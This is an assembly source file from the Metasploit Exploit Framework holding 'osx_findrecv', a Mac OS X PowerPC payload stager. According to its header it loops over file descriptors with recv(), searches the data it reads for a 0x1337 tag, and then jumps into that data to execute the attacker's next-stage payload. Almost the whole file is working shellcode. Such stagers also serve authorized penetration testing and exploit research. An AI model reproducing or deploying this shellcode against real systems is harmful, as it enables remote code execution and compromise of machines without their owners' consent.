;;
;
;        Name: osx_findrecv
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision$
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload will recv() downward until the read
;        data contains the search tag (0xXXXX1337). Once the
;        tag is located, it will jump into the payload.
;
;;



.globl _main
.text
_main:
	li 	r29, 4096
	mtctr 	r29

findsock:
	li	r0, 102
	mfctr	r3
	subi	r4, r1, 8192
	li 	r5, 8192
	li	r6, 2
	sc
	b	next
	
	lwz	r28, -8192(r1)
	cmpwi	r28, 0x1337
	btl	eq, gotsock
	xor	r5, r5, r5
next:
	bdnz-	findsock

gotsock:
	addi	r28, r1, -8188
	mfctr	r30
	mtlr	r28
	blr
	xor	r5, r5 ,r5
